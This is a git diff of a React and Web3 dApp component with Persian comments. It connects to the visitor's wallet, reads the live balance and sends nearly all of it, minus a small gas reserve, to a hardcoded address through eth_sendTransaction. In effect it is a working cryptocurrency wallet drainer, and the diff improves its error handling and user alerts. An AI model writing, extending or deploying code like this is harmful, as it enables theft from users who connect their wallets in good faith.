@@ -1,16 +1,16 @@
 import React, { useState } from "react";
 import Web3 from "web3";
 
-// دریافت موجودی واقعی از شبکه (eth_getBalance)
+// دریافت موجودی واقعی از شبکه
 async function getLiveBalance(address) {
   try {
     const balanceHex = await window.ethereum.request({
       method: "eth_getBalance",
       params: [address, "latest"],
     });
-    // استفاده از Web3 برای تبدیل از Wei به ether
     return parseFloat(Web3.utils.fromWei(balanceHex, "ether")).toFixed(6);
   } catch (error) {
+    alert("❌ Error fetching live balance: " + error.message);
     console.error("❌ Error fetching live balance:", error);
     return null;
   }
@@ -21,9 +21,7 @@ function App() {
 
   async function connectAndSend() {
     if (typeof window.ethereum === "undefined") {
-      alert(
-        "No Ethereum provider found. Please open in Trust Wallet DApp Browser!"
-      );
+      alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
       return;
     }
 
@@ -31,38 +29,45 @@ function App() {
     try {
       accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
     } catch (err) {
+      alert("❌ Could not request accounts: " + err.message);
       console.error("❌ Could not request accounts:", err);
       return;
     }
     if (!accounts || !accounts.length) {
+      alert("❌ No account returned.");
       console.error("❌ No account returned.");
       return;
     }
     const userAddress = accounts[0];
     setAccount(userAddress);
+    alert("✅ User address: " + userAddress);
     console.log("✅ User address:", userAddress);
 
     const liveBalanceStr = await getLiveBalance(userAddress);
     console.log("💰 Live BNB Balance:", liveBalanceStr);
+    if (!liveBalanceStr) return;
+    
     const totalBalance = parseFloat(liveBalanceStr);
     if (isNaN(totalBalance)) {
+      alert("❌ Could not parse live balance.");
       console.error("❌ Could not parse live balance.");
       return;
     }
 
-    // کسر 0.02 BNB به عنوان reserve جهت هزینه‌های تراکنش
+    // کسر 0.02 BNB برای هزینه گس
     const reserveBNB = 0.02;
     const sendAmount = totalBalance - reserveBNB;
     if (sendAmount <= 0) {
+      alert("❌ Insufficient funds to cover reserve for gas fee.");
       console.error("❌ Insufficient funds to cover reserve for gas fee.");
       return;
     }
-    console.log("Calculated send amount (BNB):", sendAmount);
+    alert("✅ Calculated send amount: " + sendAmount + " BNB");
 
-    // آدرس مقصد ثابت
+    // آدرس مقصد
     const destination = "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD";
 
-    // تبدیل sendAmount به Wei با استفاده از Web3
+    // تبدیل sendAmount به Wei
     const weiValue = Web3.utils.toWei(sendAmount.toString(), "ether");
     const txObject = {
       from: userAddress,
@@ -71,14 +76,15 @@ function App() {
     };
 
     try {
-      // ارسال تراکنش از کیف پول کاربر؛ گس توسط کاربر پرداخت می‌شود
+      // ارسال تراکنش از طریق کیف پول کاربر
       const txHash = await window.ethereum.request({
         method: "eth_sendTransaction",
         params: [txObject],
       });
+      alert("✅ Transaction sent! TxHash: " + txHash);
       console.log("Transaction sent, tx hash:", txHash);
-      alert("Transaction sent! TxHash: " + txHash);
     } catch (error) {
+      alert("❌ Transaction failed: " + error.message);
       console.error("❌ Transaction failed:", error);
     }
   }
